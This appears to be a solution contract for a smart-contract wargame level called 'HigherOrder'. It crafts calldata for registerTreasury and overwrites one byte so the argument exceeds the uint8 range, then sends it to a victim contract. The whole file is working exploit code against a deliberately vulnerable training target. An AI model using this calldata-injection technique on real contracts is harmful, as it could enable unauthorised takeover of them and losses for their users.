// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "./HigherOrder.sol";

contract HigherOrderAttack {
  HigherOrder public order;

  function encodedData() public view returns (bytes memory) {
    return abi.encodeWithSelector(order.registerTreasury.selector, uint8(42));
  }

  function injectedData() public view returns (bytes memory) {
    bytes memory data = encodedData();
    data[21] = hex"FF";
    return data;
  }

  function attack(address victim) public {
    (bool response, ) = address(victim).call(injectedData());
    if (!response) revert();
  }
}
